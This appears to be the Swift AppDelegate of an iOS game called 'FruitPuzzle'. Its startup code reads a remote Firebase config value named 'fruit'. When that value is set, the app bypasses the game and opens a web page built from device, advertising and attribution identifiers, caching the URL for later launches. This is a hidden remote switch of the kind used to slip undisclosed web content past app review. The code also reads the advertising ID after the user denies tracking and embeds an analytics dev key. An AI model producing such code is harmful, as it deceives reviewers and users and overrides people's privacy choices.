//
//  AppDelegate.swift
//  FruitPuzzle
//
//  Created by muser on 20.02.2025.
//

import SwiftUI
import AppTrackingTransparency
import AdSupport
import FirebaseCore
import FirebaseAnalytics
import FirebaseInstallations
import FirebaseRemoteConfigInternal
import SdkPushExpress
import AppsFlyerLib

@main
class AppDelegate: UIResponder, UIApplicationDelegate, UNUserNotificationCenterDelegate, DeepLinkDelegate {
    
    var window: UIWindow?
    weak var initialVC: ViewController?
    
    var identifierAdvertising: String = ""
    var timer = 0
    var analyticsAppId: String = ""

    static var orientationLock = UIInterfaceOrientationMask.all
    
    private let PUSHEXPRESS_APP_ID = "37732-1202"
    private var myOwnDatabaseExternalId = ""
    private var remoteConfig: RemoteConfig?
    
    func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
        FirebaseApp.configure()
        remoteConfig = RemoteConfig.remoteConfig()
        setupRemoteConfig()
        
        let viewController = ViewController()
        initialVC = viewController
        window?.rootViewController = initialVC
        window?.makeKeyAndVisible()
        AppsFlyerLib.shared().appsFlyerDevKey = "j9E6rPR3oFEUBQvgyX776A"
        AppsFlyerLib.shared().appleAppID = "6742501944"
        AppsFlyerLib.shared().deepLinkDelegate = self
        AppsFlyerLib.shared().delegate = self
        
        Task { @MainActor in
            analyticsAppId = await fetchAnalyticsAppInstanceId()
            myOwnDatabaseExternalId = analyticsAppId

            print("App Instance ID: \(analyticsAppId)")
        }

        start(viewController: viewController)
        
        AppsFlyerLib.shared().start()
        AppsFlyerLib.shared().waitForATTUserAuthorization(timeoutInterval: 60)

        //MARK: - PUSH EXPRESS
        myOwnDatabaseExternalId = analyticsAppId

        let authOptions: UNAuthorizationOptions = [.alert, .badge, .sound]
        UNUserNotificationCenter.current().requestAuthorization(options: authOptions) { granted, error in
            if let error = error {
                print("Error requesting authorization for notifications: \(error)")
            } else {
                print("Permission granted: \(granted)")
                DispatchQueue.main.async {
                    application.registerForRemoteNotifications()
                }
            }
        }
        UNUserNotificationCenter.current().delegate = self

        DispatchQueue.main.asyncAfter(deadline: .now() + 1) {
            do {
                try PushExpressManager.shared.initialize(appId: self.PUSHEXPRESS_APP_ID)
                try PushExpressManager.shared.activate(extId: self.myOwnDatabaseExternalId)
                print("PushExpress initialized and activated")
                print("externalId: '\(PushExpressManager.shared.externalId)'")

            } catch {
                print("Error initializing or activating PushExpressManager: \(error)")
            }

            if !PushExpressManager.shared.notificationsPermissionGranted {
                print("Notifications permission not granted. Please enable notifications in Settings.")
            }
        }
       
        return true
    }
    
    func fetchAnalyticsAppInstanceId() async -> String {
        do {
            if let appInstanceID = Analytics.appInstanceID() {
                return appInstanceID
            } else {
                return ""
            }
        }
    }
    
    func application(_ application: UIApplication, supportedInterfaceOrientationsFor window: UIWindow?) -> UIInterfaceOrientationMask {
        return AppDelegate.orientationLock
    }
    
    func setupRemoteConfig() {
        let settings = RemoteConfigSettings()
        settings.minimumFetchInterval = 0
        remoteConfig?.configSettings = settings
    }
    
    func start(viewController: ViewController) {
        remoteConfig?.fetch { [weak self] status, error in
            guard let self = self else { return }
            
            if status == .success {
                let appsflierID = AppsFlyerLib.shared().getAppsFlyerUID()
                
                self.remoteConfig?.activate { _, error in
                    DispatchQueue.main.async {
                        if let error = error {
                            viewController.openApp()
                            return
                        }
                        
                        if let stringFire = self.remoteConfig?.configValue(forKey: "fruit").stringValue {
                            if !stringFire.isEmpty {
                                if let finalURL = UserDefaults.standard.string(forKey: "finalURL") {
                                    viewController.openWeb(stringURL: finalURL)
                                    print("SECOND OPEN: \(finalURL)")
                                    return
                                }
                                
                                if self.identifierAdvertising.isEmpty {
                                    self.timer = 5
                                    self.identifierAdvertising = ASIdentifierManager.shared().advertisingIdentifier.uuidString
                                }
                                
                                if self.identifierAdvertising.isEmpty {
                                    viewController.openApp()
                                    return
                                }
                                
                                DispatchQueue.main.asyncAfter(deadline: .now() + .seconds(self.timer)) {
                                    let stringURL = viewController.createURL(
                                        mainURL: stringFire,
                                        deviceID: self.analyticsAppId,
                                        advertiseID: self.identifierAdvertising,
                                        appsflierId: appsflierID
                                    )
                                    print("URL: \(stringURL)")
                                    
                                    guard let url = URL(string: stringURL) else {
                                        viewController.openApp()
                                        return
                                    }
                                    
                                    if UIApplication.shared.canOpenURL(url) {
                                        viewController.openWeb(stringURL: stringURL)
                                    } else {
                                        viewController.openApp()
                                    }
                                }
                                
                            } else {
                                viewController.openApp()
                            }
                        } else {
                            viewController.openApp()
                        }
                    }
                }
            }
        }
    }
    
    func application(_ application: UIApplication, open url: URL, sourceApplication: String?, annotation: Any) -> Bool {
        AppsFlyerLib.shared().handleOpen(url, sourceApplication: sourceApplication, withAnnotation: annotation)
        return true
    }
    
    func applicationDidBecomeActive(_ application: UIApplication) {
        AppsFlyerLib.shared().waitForATTUserAuthorization(timeoutInterval: 60)
        ATTrackingManager.requestTrackingAuthorization { (status) in
            self.timer = 10
            switch status {
            case .authorized:
                self.identifierAdvertising = ASIdentifierManager.shared().advertisingIdentifier.uuidString
                self.timer = 1
            case .denied:
                print("Denied")
                self.identifierAdvertising = ASIdentifierManager.shared().advertisingIdentifier.uuidString
            case .notDetermined:
                print("Not Determined")
            case .restricted:
                print("Restricted")
            @unknown default:
                print("Unknown")
            }
        }
        AppsFlyerLib.shared().start()
    }
    
    //MARK: - Push Notification Handling
    func application(_ application: UIApplication, didRegisterForRemoteNotificationsWithDeviceToken deviceToken: Data) {
        let tokenParts = deviceToken.map { data in String(format: "%02.2hhx", data) }
        let token = tokenParts.joined()
        print("Device Token: \(token)")
        PushExpressManager.shared.transportToken = token
    }

    func application(_ application: UIApplication, didFailToRegisterForRemoteNotificationsWithError error: Error) {
        print("Failed to register for remote notifications: \(error)")
    }

    func userNotificationCenter(
        _ center: UNUserNotificationCenter,
        willPresent notification: UNNotification,
        withCompletionHandler completionHandler: @escaping (UNNotificationPresentationOptions) -> Void
    ) {
        let userInfo = notification.request.content.userInfo
        print("Received notification while app is in foreground: \(userInfo)")
        completionHandler([.banner, .list, .sound])
    }

    func userNotificationCenter(_ center: UNUserNotificationCenter,
                    didReceive response: UNNotificationResponse,
                    withCompletionHandler completionHandler: @escaping () -> Void
    ) {
        let userInfo = response.notification.request.content.userInfo
        print("Handling notification response: \(userInfo)")
        NotificationCenter.default.post(name: Notification.Name("didReceiveRemoteNotification"), object: nil, userInfo: userInfo)
        completionHandler()
    }
}

extension AppDelegate: AppsFlyerLibDelegate {
    func onConversionDataSuccess(_ data: [AnyHashable: Any]) {
        print("onConversionDataSuccess \(data)")
    }
    
    func onConversionDataFail(_ error: Error) {
        
    }
}

